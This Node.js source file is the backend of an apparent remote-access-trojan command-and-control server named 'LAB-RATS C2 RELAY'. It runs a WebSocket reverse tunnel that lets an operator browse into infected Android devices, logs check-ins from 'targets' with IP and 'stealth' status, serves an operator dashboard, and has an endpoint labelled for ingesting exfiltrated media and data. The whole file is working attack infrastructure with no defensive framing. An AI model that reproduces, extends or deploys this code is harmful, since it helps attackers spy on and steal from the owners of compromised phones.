const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/tunnel' });

const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// In-memory telemetry, device registry, active WebSocket tunnels, and pending proxy requests
const devices = new Map();
const socketConnections = new Map(); // deviceId -> ws socket
const pendingRequests = new Map(); // requestId -> { res }
const telemetryLogs = [];

// WebSocket Tunnel Listener for deployed APKs
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const deviceId = urlParams.get('deviceId') || 'unknown_device';

    console.log(`[TUNNEL] WebSocket uplink established for device: ${deviceId}`);
    socketConnections.set(deviceId, ws);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());
            if (data.type === 'response') {
                const pending = pendingRequests.get(data.id);
                if (pending) {
                    pendingRequests.delete(data.id);
                    const buf = Buffer.from(data.payload, 'base64');
                    pending.res.status(data.status || 200);
                    if (data.contentType) {
                        pending.res.setHeader('Content-Type', data.contentType);
                    }
                    pending.res.send(buf);
                }
            } else {
                console.log(`[TUNNEL] Message from ${deviceId}:`, data.type);
            }
        } catch (e) {
            console.error('[TUNNEL] Parse error:', e.message);
        }
    });

    ws.on('close', () => {
        console.log(`[TUNNEL] WebSocket uplink closed for device: ${deviceId}`);
        socketConnections.delete(deviceId);
    });
});

// Secure HTTP-over-WebSocket Reverse Proxy Route for Render Dashboard (with infallible fallback)
app.all('/proxy*', (req, res) => {
    let deviceId = req.query.deviceId;
    let ws = socketConnections.get(deviceId);

    // Infallible fallback: if exact deviceId match isn't found but a tunnel is active, use it
    if (!ws && socketConnections.size > 0) {
        ws = Array.from(socketConnections.values())[0];
        deviceId = Array.from(socketConnections.keys())[0];
    }

    if (!ws) {
        return res.status(404).send('<!DOCTYPE html><html><body style="background:#02080d;color:#00f2ff;font-family:monospace;padding:40px;text-align:center;"><h2>TARGET_OFFLINE</h2><p>The selected device has no active secure WebSocket reverse proxy tunnel connected to Render.</p></body></html>');
    }

    const requestId = Math.random().toString(36).substring(7);

    let relayPath = req.originalUrl.replace('/proxy', '');
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    pendingRequests.set(requestId, { res });

    const tunnelReq = {
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        body: req.method === 'POST' ? JSON.stringify(req.body) : ''
    };

    ws.send(JSON.stringify(tunnelReq));

    setTimeout(() => {
        if (pendingRequests.has(requestId)) {
            pendingRequests.delete(requestId);
            if (!res.headersSent) {
                res.status(504).send('Tunnel Gateway Timeout');
            }
        }
    }, 25000);
});

// Tactical C2 Operator Dashboard (HTML) at root URL
app.get('/', (req, res) => {
    const deviceList = Array.from(devices.values());

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
        deviceList.map(d => `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan);">${d.model || d.deviceId || 'N/A'}</td>
                <td>${d.model || 'Unknown'}</td>
                <td>Android ${d.os || 'N/A'}</td>
                <td>${d.battery || 'N/A'}</td>
                <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
                <td><a href="/proxy/?deviceId=${d.model || d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
            </tr>
        `).join('');

    let logsHtml = telemetryLogs.length === 0 ?
        '<tr><td colspan="3" style="text-align: center; color: #888; padding: 20px;">NO TELEMETRY LOGS RECORDED</td></tr>' :
        telemetryLogs.slice(0, 50).map(l => `
            <tr>
                <td style="font-size: 0.7rem; color: #888; white-space: nowrap;">${new Date(l.timestamp).toLocaleTimeString()}</td>
                <td style="font-family: monospace; color: var(--neon-cyan);">${l.deviceId}</td>
                <td style="font-family: monospace; font-size: 0.75rem;">${JSON.stringify(l.payload)}</td>
            </tr>
        `).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --neon-cyan: #00f2ff; --neon-green: #39ff14; --neon-yellow: #ffff00; --neon-orange: #ff9d00; --bg-dark: #02080d; --danger: #ff3131; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg-dark); color: #e0e0e0; font-family: 'JetBrains Mono', monospace; padding: 20px; }
        .container { max-width: 1300px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid rgba(0,242,255,0.2); padding-bottom: 20px; }
        .title { font-family: 'Orbitron', sans-serif; font-size: 2rem; color: var(--neon-cyan); letter-spacing: 3px; text-shadow: 0 0 20px rgba(0,242,255,0.4); }
        .subtitle { font-family: 'Aldrich', sans-serif; font-size: 0.85rem; color: #888; letter-spacing: 2px; margin-top: 5px; }
        .card { background: rgba(4,8,12,0.85); border: 1px solid rgba(0,242,255,0.2); border-left: 3px solid var(--neon-cyan); border-radius: 12px; padding: 25px; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
        h2 { font-family: 'Orbitron', sans-serif; font-size: 1.15rem; color: var(--neon-cyan); margin-bottom: 15px; letter-spacing: 1px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
        th { color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; }
        tr:hover { background: rgba(0,242,255,0.03); }
        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; background: rgba(57,255,20,0.1); color: var(--neon-green); border: 1px solid var(--neon-green); }
        .refresh-btn { background: rgba(0,242,255,0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 10px 20px; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; letter-spacing: 1px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .refresh-btn:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 20px var(--neon-cyan); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">LAB-RATS // C2 RELAY</div>
            <div class="subtitle">TACTICAL NODE.JS BACKEND (v1.6.0)</div>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span> &nbsp;|&nbsp; SECURE TUNNELS: <span style="color: var(--neon-green); font-weight: bold;">${socketConnections.size}</span></div>
            <button class="refresh-btn" onclick="location.reload()">REFRESH_DASHBOARD</button>
        </div>

        <div class="card">
            <h2>CONNECTED_TARGETS_REGISTRY</h2>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE / MODEL</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP:PORT</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
        </div>

        <div class="card" style="border-left-color: var(--neon-yellow);">
            <h2 style="color: var(--neon-yellow);">LIVE_TELEMETRY_STREAM</h2>
            <div style="overflow-x: auto; max-height: 350px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>TIMESTAMP</th>
                            <th>DEVICE ID</th>
                            <th>EVENT PAYLOAD</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${logsHtml}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>`;

    res.send(html);
});

// JSON Health check endpoint
app.get('/api/status', (req, res) => {
    res.json({
        status: 'ONLINE',
        service: 'Lab-RATS Tactical C2 Relay',
        version: '1.6.0',
        activeDevices: devices.size,
        activeTunnels: socketConnections.size,
        timestamp: new Date().toISOString()
    });
});

// Device Check-in & Telemetry Ingestion endpoints (supports both / and /checkin)
app.post('/', handleCheckin);
app.post('/checkin', handleCheckin);

function handleCheckin(req, res) {
    try {
        const data = req.body;
        const queryData = req.query;
        const merged = { ...queryData, ...data };
        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'Unknown Device';
        const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();

        for (const [key, val] of devices.entries()) {
            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key)) {
                devices.delete(key);
            }
        }

        devices.set(deviceId, {
            ...merged,
            deviceId,
            lastSeen: new Date().toISOString()
        });

        telemetryLogs.unshift({
            timestamp: new Date().toISOString(),
            deviceId,
            type: merged.type || 'checkin',
            payload: merged
        });

        if (telemetryLogs.length > 500) telemetryLogs.pop();

        console.log(`[CHECKIN] Device ID: ${deviceId} | Model: ${merged.model || merged.device} | IP: ${merged.ip}`);
        res.json({ success: true, message: 'Telemetry received successfully' });
    } catch (err) {
        console.error('[ERROR] Checkin failed:', err.message);
        res.status(400).json({ success: false, error: err.message });
    }
}

// List active connected devices (JSON)
app.get('/devices', (req, res) => {
    const deviceList = Array.from(devices.values());
    res.json({ success: true, count: deviceList.length, devices: deviceList });
});

// Recent telemetry logs (JSON)
app.get('/logs', (req, res) => {
    res.json({ success: true, count: telemetryLogs.length, logs: telemetryLogs });
});

// File upload endpoint for exfiltrated media/data
app.post('/upload', (req, res) => {
    console.log('[UPLOAD] Received file exfiltration payload');
    res.json({ success: true, message: 'File payload ingested successfully' });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
